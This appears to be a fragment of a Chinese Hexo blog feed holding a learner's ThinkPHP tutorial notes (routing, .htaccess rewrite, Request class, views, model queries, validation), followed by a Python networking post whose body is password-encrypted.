class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;域名&#x2F;模块名&#x2F;控制器名称&#x2F;操作方法名称&#x2F;参数名&#x2F;参数值</span><br></pre></td></tr></table></figure><p>隐藏入口文件我们需要对apache进行重写，具体操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.httpd.conf配置文件中加载了mod_rewrite.so模块</span><br><span class="line">2.AllowOverride None 将None改为 All</span><br><span class="line">3.把下面的内容保存为.htaccess文件放到应用入口文件的同级目录下</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">2.Options +FollowSymlinks -Multiviews</span><br><span class="line">3.RewriteEngine on</span><br><span class="line">4.</span><br><span class="line">5.RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">6.RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">7.RewriteRule ^(.*)$ index.php?&#x2F;$1 [QSA,PT,L]</span><br><span class="line">8.&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><p><strong>使用Apapche的重写机制隐藏入口文件后，如果在整个url后面加上.html后缀, 让整个url看起来像是访问的静态页面。这叫做“伪静态”。</strong></p><hr><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>我们可以在application/config.php下开启调试模式</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/6.png" class title="This is an test image"><p>开启前后对比：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/7.png" class title="This is an test image"><hr><h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><p>一般TP的模块需要三个目录(MVC) 两个php文件(common,config)</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/8.png" class title="This is an test image"><h4 id="设置默认访问模块"><a href="#设置默认访问模块" class="headerlink" title="设置默认访问模块"></a>设置默认访问模块</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/9.png" class title="This is an test image"><h4 id="命令行创建模块"><a href="#命令行创建模块" class="headerlink" title="命令行创建模块"></a>命令行创建模块</h4><p>一般在TP的根目录下，有一个think文件，我们可以通过命令行执行这个文件，创建模块或控制器等。</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/10.png" class title="This is an test image"><h5 id="创建模块-1"><a href="#创建模块-1" class="headerlink" title="创建模块"></a>创建模块</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php think build --module 模块名</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/11.png" class title="This is an test image"><p>执行成功后会自动生成那个五个文件，不需要手动创建。</p><h5 id="创建控制器"><a href="#创建控制器" class="headerlink" title="创建控制器"></a>创建控制器</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php think make:controller 模块名/控制器名 </span><br><span class="line">php think make:controller 模块名/控制器名 --plain</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/12.png" class title="This is an test image"><p>创建控制器时，同样会创建一些常用的方法。</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/13.png" class title="This is an test image"><p><strong>加上 –plain 参数 表示创建没有方法的空控制器类。否则控制器类中会自带一些方法。</strong><br>比如：创建home模块Index控制器，执行命令 php think make:controller home/Index即可。<br><strong>注意：控制器名首字母大写。</strong></p><h5 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php think make:model 模块名&#x2F;模型名</span><br></pre></td></tr></table></figure><p><strong>注意：模型名首字母大写</strong></p><hr><h3 id="Request请求类"><a href="#Request请求类" class="headerlink" title="Request请求类"></a>Request请求类</h3><h4 id="1-获取输入变量"><a href="#1-获取输入变量" class="headerlink" title="1.获取输入变量"></a>1.获取输入变量</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/14.png" class title="This is an test image"><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/15.png" class title="This is an test image"><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/16.png" class title="This is an test image"><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/17.png" class title="This is an test image"><p>总体来说获取输入变量有四个方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.通过创建request类</span><br><span class="line">$request &#x3D; \think\Request::instance();</span><br><span class="line">$name &#x3D; $request-&gt;param(&#39;name&#39;);</span><br><span class="line">echo $name;</span><br><span class="line"></span><br><span class="line">2.通过tp提供的request()助手函数</span><br><span class="line">$request1 &#x3D; request();</span><br><span class="line">$id &#x3D; $request1-&gt;param(&quot;id&quot;);</span><br><span class="line">echo $id;</span><br><span class="line"></span><br><span class="line">3.通过继承Controller类</span><br><span class="line">$request3 &#x3D; $this-&gt;request;</span><br><span class="line">$password &#x3D; $request3-&gt;param(&quot;pw&quot;);</span><br><span class="line">echo $password;</span><br><span class="line"></span><br><span class="line">4.通过input()函数</span><br><span class="line">$in &#x3D; input(&quot;param.qq&quot;);</span><br><span class="line">echo $in;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.tpshop.com&#x2F;index&#x2F;test&#x2F;da4er&#x2F;name&#x2F;da4er&#x2F;id&#x2F;1&#x2F;pw&#x2F;3333&#x2F;qq&#x2F;666</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/18.png" class title="This is an test image"><h4 id="参数绑定"><a href="#参数绑定" class="headerlink" title="参数绑定"></a>参数绑定</h4><p><strong>方法参数绑定是把URL地址（或者路由地址）中的变量作为操作方法的参数直接传入。</strong><br>这样就可以直接在方法里使用。<br>例如如下代码：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/19.png" class title="This is an test image"><p>在我们方法这个方式时，传递的id参数值会直接输出。</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/20.png" class title="This is an test image"><p>我们可以随意添加参数：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/21.png" class title="This is an test image"><h4 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h4><p>听起来很高大上，其实通俗的讲就是：我们<strong>声明的一个类的实例，在另一个类的方法的参数中传递。</strong></p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/22.png" class title="This is an test image"><p>在TP框架中也有使用的依赖注入：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/23.png" class title="This is an test image"><p>所以我们可以直接调用request类的方法。<br>如下图使用：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/24.png" class title="This is an test image"><p>对Request类的总结：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.获取请求对象  </span></span><br><span class="line">$request = request();</span><br><span class="line">$request = \think\Request::instance();</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;request; <span class="comment">//仅限于继承了底层控制器的情况下</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(Request $request)</span>  //依赖注入</span></span><br><span class="line"><span class="function"> //2. 接收请求参数 <span class="title">param</span>方法</span></span><br><span class="line">$params = $request-&gt;param();</span><br><span class="line">$params = input();</span><br><span class="line">$params = request()-&gt;param();</span><br><span class="line">$id = $request-&gt;param(<span class="string">'id'</span>);</span><br><span class="line">$id = input(<span class="string">'id'</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span><span class="params">($id)</span>//参数绑定</span></span><br></pre></td></tr></table></figure><hr><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><h4 id="视图的组成"><a href="#视图的组成" class="headerlink" title="视图的组成"></a>视图的组成</h4><p><strong>TP框架下有一个封装好的View类，可以类似Smarty一样对html赋值</strong></p><h4 id="模板的定义"><a href="#模板的定义" class="headerlink" title="模板的定义"></a>模板的定义</h4><p>为了对模板文件更加有效的管理，ThinkPHP对模板文件进行目录划分，默认的模板文件定义规则是：视图目录/控制器名（小写）/操作名（小写）+模板后缀<br>比如：admin模块index控制器的index方法调用的模板定义在了view/index/index.html</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/25.png" class title="This is an test image"><h4 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h4><p>在控制器方法中渲染有两种方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种：使用assign方法进行模板赋值，使用fetch方法进行模板渲染。</span><br><span class="line">第二种：使用助手函数view(), 进行模板渲染并赋值。</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/26.png" class title="This is an test image"><h4 id="整合模板和框架"><a href="#整合模板和框架" class="headerlink" title="整合模板和框架"></a>整合模板和框架</h4><p>模板整合思路：</p><p>①确定页面的访问路径（模块、控制器、方法）<br>②新建对应的控制器方法，在方法中调用模板<br>③将模板页面移动到对应的视图目录下（创建子目录）<br>④将静态资源文件移动到public/static/admin目录下<br>⑤修改模板文件中静态资源路径</p><h5 id="模板布局"><a href="#模板布局" class="headerlink" title="模板布局"></a>模板布局</h5><p>这个比较特殊。使用模板布局，就是把多个模板页面都有的公共代码给抽取出来，放到一个公共位置开发维护。<br>好处：相同的代码只维护一份，减少代码工作量。<br><strong>全局布局设置步骤：</strong><br>1.application/模块名/config.php,加入以下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;template&#39;  &#x3D;&gt;  [</span><br><span class="line">    &#39;layout_on&#39;     &#x3D;&gt;  true,&#x2F;&#x2F;开启布局</span><br><span class="line">    &#39;layout_name&#39;   &#x3D;&gt;  &#39;layout&#39;,&#x2F;&#x2F;布局文件名称</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>我们在view下创建一个layout.html就会自动调用这个html文件</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/27.png" class title="This is an test image"><p>调用顺序：当启用layout时，不管是否定义了别的模板，layout.html先被调用，其会覆盖掉别的定义模板。<br>在layout.html中使用自定义的模板，可以使用CONTENT关键字。<br>用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;__CONTENT__&#125;</span><br></pre></td></tr></table></figure><p>临时关闭layout可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;view-&gt;engine-&gt;layout(false);</span><br></pre></td></tr></table></figure><p>注：也可以使用<strong>STATIC</strong> 代替静态资源路径中的/static</p><hr><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><p>在application/database.php中配置数据库信息</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/28.png" class title="This is an test image"><h5 id="特殊表名处理"><a href="#特殊表名处理" class="headerlink" title="特殊表名处理"></a>特殊表名处理</h5><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/29.png" class title="This is an test image"><h5 id="查询多个数据"><a href="#查询多个数据" class="headerlink" title="查询多个数据"></a>查询多个数据</h5><p>有很多方法，这里写我喜欢用的一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$goods &#x3D; new GoodsModel();</span><br><span class="line">$data &#x3D; $goods -&gt;select();</span><br><span class="line">$data &#x3D; (new \think\Collection())-&gt;toArrary();</span><br></pre></td></tr></table></figure><p><strong>动态调用select方法来获取数据，最后通过collection类整合成标准的二维数组</strong><br>后台商品展示实例：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/30.png" class title="This is an test image"><h5 id="查询一条数据"><a href="#查询一条数据" class="headerlink" title="查询一条数据"></a>查询一条数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$good &#x3D; new GoodsModel();</span><br><span class="line">$data &#x3D; $good-&gt;find($id);</span><br><span class="line"></span><br><span class="line">where(&#39;字段名&#39;,&#39;表达式&#39;，&#39;查询条件&#39;)</span><br><span class="line">$good &#x3D; new GoodsModel();</span><br><span class="line">$data &#x3D; $good-&gt;where(&#39;id&#39;,&#39;&#x3D;&#39;,$id);</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/31.png" class title="This is an test image"><h5 id="连贯查询"><a href="#连贯查询" class="headerlink" title="连贯查询"></a>连贯查询</h5><p>原理：中间调用的方法，返回值是对象，可以继续调用对象的其他方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$model = <span class="keyword">new</span> Address();</span><br><span class="line"></span><br><span class="line">$model-&gt;field(<span class="string">'id,name'</span>)-&gt;select(); <span class="comment">//指定要查询的字段，原生sql中select后面的字段</span></span><br><span class="line"></span><br><span class="line">$model-&gt;order(<span class="string">'id desc,time desc'</span>)-&gt;select(); <span class="comment">//相当于原生sql中的order by</span></span><br><span class="line"></span><br><span class="line">$model-&gt;limit(<span class="number">3</span>)-&gt;select(); <span class="comment">//相当于原生sql中的limit条件</span></span><br><span class="line"></span><br><span class="line">$model-&gt;limit(<span class="number">0</span>,<span class="number">3</span>)-&gt;select(); </span><br><span class="line"></span><br><span class="line">$model-&gt;limit(<span class="string">'0,3'</span>)-&gt;select(); </span><br><span class="line"></span><br><span class="line">$model-&gt;group(<span class="string">'cate_id'</span>)-&gt;select();  <span class="comment">//相当于原生sql中的group by</span></span><br><span class="line"></span><br><span class="line">$model-&gt;having(<span class="string">'id&gt;3'</span>)-&gt;select();  <span class="comment">//相当于原生sql中的having条件</span></span><br><span class="line"></span><br><span class="line">$model-&gt;alias(<span class="string">'a'</span>)-&gt;join(<span class="string">'think_user_type t'</span>,<span class="string">'a.id=t.user_id'</span>, <span class="string">'left'</span>)-&gt;select(); <span class="comment">//alias方法设置别名，join方法连表查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Address::alias('a')-&gt;join('tpshop_user u','a.user_id = u.id', 'left')-&gt;select();</span></span><br></pre></td></tr></table></figure><h5 id="字段数据查询"><a href="#字段数据查询" class="headerlink" title="字段数据查询"></a>字段数据查询</h5><p>有两种方法，一种使用find()查询后，用索引的方式调用。另一种就是调用value方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$good = <span class="keyword">new</span> GoodModel();</span><br><span class="line">$data = $good-&gt;find($id)-&gt;value(<span class="string">'goods_name'</span>);</span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">$data = $good-&gt;find($id);</span><br><span class="line">$content = $data[<span class="string">'goods_name'</span>];</span><br></pre></td></tr></table></figure><h5 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h5><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/32.png" class title="This is an test image"><h6 id="查询数据-一条"><a href="#查询数据-一条" class="headerlink" title="查询数据(一条)"></a>查询数据(一条)</h6><p>save()</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/33.png" class title="This is an test image"><h6 id="查询数据-多条"><a href="#查询数据-多条" class="headerlink" title="查询数据(多条)"></a>查询数据(多条)</h6><p>saveAll()</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/34.png" class title="This is an test image"><h6 id="过滤非数据表字段"><a href="#过滤非数据表字段" class="headerlink" title="过滤非数据表字段"></a>过滤非数据表字段</h6><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/35.png" class title="This is an test image"><h5 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h5><p>使用tp给的一个类:<strong>new \think\Validate()</strong></p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/36.png" class title="This is an test image"><p>TP框架的基本操作已经学完，以后就是看TP手册自己调试。</p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;第一部分&quot;&gt;&lt;a href=&quot;#第一部分&quot; class=&quot;headerlink&quot; title=&quot;第一部分&quot;&gt;&lt;/a&gt;第一部分&lt;/h3&gt;&lt;h4 id=&quot;框架概述&quot;&gt;&lt;a href=&quot;#框架概述&quot; class=&quot;headerlink&quot; title=&quot;框架概述&quot;&gt;&lt;/a&gt;框架概述&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;框架就是一些代码类、方法（函数）、变量、常量的集合，这些代码是功能结构性的代码（并非业务代码）。业务代码其实就是具体的一些模块的增删改查逻辑代码。使用框架开发项目，有便于代码重用、开发效率高、代码规范好、便于功能扩展等优点。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;一般框架都是基于MVC架构。&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Python网络编程小总结</title>
    <link href="https://da4er.top/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-16T03:27:13.000Z</published>
    <updated>2020-03-16T03:32:57.807Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3079619048a6310f3ac16393c8b767e3fbff0dd0a11a79d5ad8e784217598621">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7fcb84183242a4f406e8b34ca1d4a44d4ca09161a2ff41d5b2f04ab3499364eff71e39fcf83ab96ac76123ed5bb16f4e088400a8d8040fad0667dfc42cb7d1fa63e448228607ca24df0232561378995365475e78f314e3b07003fa98288097633fb25e791bba121c652d0d5e6c0de92fce7af07d5a4969b7ac1a0d365eca3f464e20c55ad8d0ce230263f77852acedc7ec223331723485c6e4bac8a516c20026f1f3b24aa12bbb06c0b9fd1998b47e0b0e47bb0147e5fb8b568d8aafb9ec1b8b45ba2d2def698460ad9a3942f942a5ad40da397ad25944f64cba9ec46844420dd25961a8468bbdd1c0e2b27192fe152529cffffed1da6e5fa15f66644bb7e18f08ab8d53ca1b467d7cb23ec5bc62eb97d5366d3c60ac953444a42ea23c8eec489e2d10127b786cb7d0c60c95f4f5153f1d373d31345564bde2f2b4954514ed32893a5c7b24a53a7a65d76c255635ce794a776ba721a32a92426c93d849dbd108614cb2e2a44dbdf4640ef3d8b0e8ea68b5082452eadf21f8e298eb36dc5548db326df4ef1c6908c7a424c27d8238466fe10d6dc7488211fe0126801f300aabbfafa77398663b42135a534f225b1382fdd662edd403d33da6fc6ff17ea0ad9ae7dc6f01dcfcce366ba9da74e88e305b1d362fc027f86728e913f35436b59bb03868859eb590c87871f6891a0f61925d04edd077b435f6eed3e2f1cc6275f691092128df599cf96ae65b2c69ae1e263accf15e96f10da117ee69a29204e6e76ca94601ba99e4f58b7965e280dc879a32c261fc244e176539abcfe9495a90cf318080a074c2259e3f5e06584c79b70979df04b7400be59f12a8519abfddb2fc59a429a4ed087cad685f21aef6338562b1eff7a31a58ea324c83c8b888ffa799408a377f55749f35ee12d35041a643a97bfd5c7e9120bd5c71ab0a5439b81b6a1d15fbab1cbbb35879493d5f6dbd8b51b6880c67d7b591fdac90433c9d400737cf4e923722feee2f0c178bc8c376872f2bc2b009869a1c20c35ea4bbf66db2d776691b1226690cd0e1834ad7205dab84f7503fe44ee439fe2c9fd7fa8d3fca33f59dd6fea3a65616fe3dec27ea777b4d03e4ace3c054a7bed8a7b01910172e38781614da155cebe6c7ede010127d2cdba80472a6266f14189935a9b79f9b40f9a8430021072f85a5edc13ff861f420ad6575eb6ae0323a152c20445e810f12cfaa1769bdf927b335dc737857c4d3d0f341a086dada083c9bbc4bcd7c443e3f45cf2c3411ceb5a4841320fff5c8110f367f010e11e4fa56f74e1a0b790020aba0e148e119237292ca4c642d9c607af18d48a5ca60f46883d3de4fbf692634cef4a11b0e8cda4d7ea48b28c1995feef5fdfef7121293b92a81bb87410ff355bad4805aafee8140722429cb8379c7704ccbb16eebf6d9723e42ef27929fdc0c5f01657d3806975892d9846a022f83a5df442590fcda8e74a45fb561948f13d7098e3dcbaa879c27eb15a9cc5986e914bc2aaf5688f4e25d8510288ccb4e1852fbddbc14283baec15b852e7c739cfff1367000311e60526e16c1b1bb72d525c9893e646ea446b8ef8cab56347de7a429fce1a6caf641871637b1e693f79d75ba6692d917a92f33d2757152713cde5fb4bbc7a4f7ac15b8ec4adada8b24bc0a6db1cb0dc50123b293878f019c5d0904b36344c935fa120f964d7e23eedf2023cb78f248cd0b1a96e008af94d6d458c6158aa447f370c3983a5c803cc05d325109f9fb00b1fb38d02a8ca005945b75e6ad145aa8aad597428343e953b0e6488aedace67bfbec1e74f797d41eb826babb08f3ffe6467eb7e6980fabe95d9aa0d09c9d666f4e4bb3ec22dce3a84e790b6775c587a6a679fdfacdc0f35d4dfeef5c5d42bd96001067b564a96803126f5c9d85d205ac9358568b5a2a264c8fa68ec1dbfeefb139e1add685a1ef4fc0c966e766164fa82514f9126253d7a4d483e36387d0d955ace7c91364250dc118f1eda2eec18cfdef13f6a99b529dc2dda8e66c6a3ee45c070594730dfe863e131748d8ac613d34725cbf576031d0a4dc16aecd3f75e9b7b3e66839c4a376e8ed2070087d33cf3512a0415cfc31b8f36b2b8400a2eced3eb9be8f19f9f2173246064c82d61bf6d2887b820290084e61f0c85bfa6dc0e1feb5aac44e8b97cd5e81c8292822c3ab043415b0201381f38a75c95c6235e6670e67284b4cd495202793d697b8ce1d069654bcbeee06775bb0bb8ff843902261f95c96c0fef7eda63a47854d9233aed893b79ae194d8d29422ce5e0d9b35fa767e602497d3cfebcdef2a782c4f3a4a9bfc38f1e85a41978ba1b8a229c731dd2845a6c52d930cc68c40d9c4d8529a014c6445721333e2fab895062b20ffd6f440c18eeccfc81dde0547adc2f69a499d4057c4d2dce3111ca6109de904567b2e5a85b20fb93e4042802a0f37fc432e20c295fab48e94d871895f1ad695b2eb1eb98941506bb3d72d8135d274c161e77274daf612c1b14814a99a5125c7c36f9f9e5a4588c0466e1e535a4fd55f2224ed1da4ea1aff3ee14215cf9e4ad88c271134d3d0957a075828ea99fd53dab6ef33a7c526d0ca71151ee8caab9520679a56989542ac913e189ec42934c211e72a53aa783b88885745f53f08d679f03489f704effc7f92603e6c61798a6b5c1eb3e03fd495b88050b559fb430981869606146086aadca42bf40a255ad828e952179130c74240dfef051d9ef9ddb6093d55a387402d3b3091cb2d1e90688286923652aad7dfd6fa9e2a1c2ce2692232a9c85b26ebab64eaa4c0337a223cc4ca8b1568a6be7dd745f010b77d4f94f546c33a9be228610e2c1e89f6fff3e5616af0d70b0560467c16051a94a806828b09e8ccdf27ea9c8a5af906c2a38b8bd6492fd939bea15d50fe5d360ea3c546e5844337c3039c7876e24f9316a5fbc09375f7d7de04be5d428a969ec55991bf81febc5ee8cd5cbf2e1a575a42f0e9ad4cf3725ec176532963d8274119f19719f50a912043fda3e6510a33bdd72cb86eac97d705059899fb28d9f6d13cf28fb526255478f7403aa2ba10d1c10f11e985a989ef24b35fafacc0be22206cbe47adf50d851e5358ae07815c43a8ea768e025d94d6e6dbb1fff014a7164e68659e89de402a109a348c941ddbdc5e48cad8abfa197b70fbd7248635deeee6cb407b1a8ec49382876a54c072fac1657ce6529d293b7e3c34a2d4af1e8d325e9593e5a1b27d551589bd590bc5429e14b0d6398da2fdf91e20fc4a3638b3e483d48368b39341329544e3cc96969b847a3ab3ff1c89ecb85feeaa3e048a6f7c360e0e4c9d427c126b94db63cff9ac79223979e89f0d5bd9d1a7438db070a1ca186b3198ebae11eb901085b394f8fdce37d713fb8cc82122d52d312d2a445d873b2f3fccb1a46f9940e957f8674bbb01454d8a3910ae1dd11e52c0c4f289fdafb1e3dcdad41b0b0a04ba6910f92d32a6aa1e159a80d4a9933247fe0c3e74e68d54ebf7ab6a2098cd7da9c70e524c955117d7481a15f2d685d0091acb027b6f2485ab09bf114ecb152df622baebcd8513d5774042140a9443f2d25f69ea65329631a0598c9e15ae28a184c029bc8b7ff72da1d6ed9b5d82870468d79e17c7371f4ebe7c0b913d8a1e7337fffd61fb52374ef21af2ded14ca927f3be7ee2ef14d44bddddf6ea0e02f77ccd2dd7e49105a8d9ca7532b95928aaeef214457ff34ec66211b615e784c174a89b897170d56658b8150cf2b3da9df905a544599262ac6a99000afe8a7b19d156a3b5536bf58004d406c224fbee4ae47d05cd4cd5b9db916c59632636ee657d5537ce053879ef7053849a7eaeb45aa21538772ceed3ab9d415649b5604c85e0814238e7ace121528c61a96c917852e252c5c4ec63f0e4ad909ba449aaabf13dd37c9fa863cc427ffa311385f2f97ee19b46f704f06f522d2ec2ecb1c9d000f9d1db9a342db653a13cc59deca9d9e67cd6b38ca9ec63fdfc2a9151574787955742e275a4b43c884e0778c5bc21149a64a8e906db2f7a7b017855d2897a970ad3794ca82059eed00da7341d89e555be64e339f5172330b820315d9613bd8d99c5cc746be678159902c6b8a5ce1fa98e4cac6413cc7daf35547a9ccdda32a102f61a8cde7243b988e9691495cacd3e686f3aef35032b175d46d4dc9bd49fd61d6ec4c73b06db77c42b410d50277e5e2bc208ac1571fb24d42798bc046e27d0b325fe2782315ea807a841240aca618f4a8c187aac3f06e16c8c9f21f2d54a0d9598e0534b9ca2ef76f1de71bde8c7c073d0d35564048d8a35282f48cf4cf48975afa2413747afd6e4f3956c082e7ff46ffbbc2818da294648678541ef5088b2072e896d4e1ee088d251c7d9943211202b16edf745348eec7f4e5f02c1884163b0a525e1c01e17cfb9ea135f1bb11216b049e4130e63f93c73357e93557557a9439c4bd17f74fd3e8f157927c56d496ff719d64c25f73c97ab66771d0699effd0408088054b9de8baf9c0998a0c590f314cdbcedb19188cf0a8836ae521dfc48170411b0e62e02d11e4dac9d0a59822aa01c4d60640ac2200e2f2d19e5d1536d55ca79fae113ca1bb986fbffadf65e6a82860cce89010b3d4e8da33e775797f2af509fe5abb9a5e13e38c2ddaa3016bb08c6436802b9365839a5462c748aa82802f7ea9e949a0fad7089bd2af23f8632c4d82b5ae7d24ea8f9d5ee12a566b5f67dbda0cd5e1067a8a138ea871ad677d7444a1768014da5df62cba10f3b2186b49c961d8985aa110c7c1b0fd0cc6b5f1228a317890c31d9cb50161bae9604ed17373615ee7ef3d758715ad130bde42ffa25177d2232e7fde4390025943c4632acd36b3912fb3c4a0b2c4cd8b790e38c53eac0ba9e7a89ae22af6bd520e4ab45c96a0a21f03de7fc71e5ffb28c855c5bcfff2562e7bde7dee7d9737a8a4d7d29c46320e3f8491ac676c6f4fc546c53c1a9a5f2aea8943bc7568d786a79e9a8121ba57e2e186c54c2715624fd5ab4a20e55189d66342cacad149109ca63ba79650efa91a17a7fc65a60eee4ecc379ae7f81b51cfacd7d3aa6a73d3b0bf43823c63e53f35c790dd0ad2decce38f7e3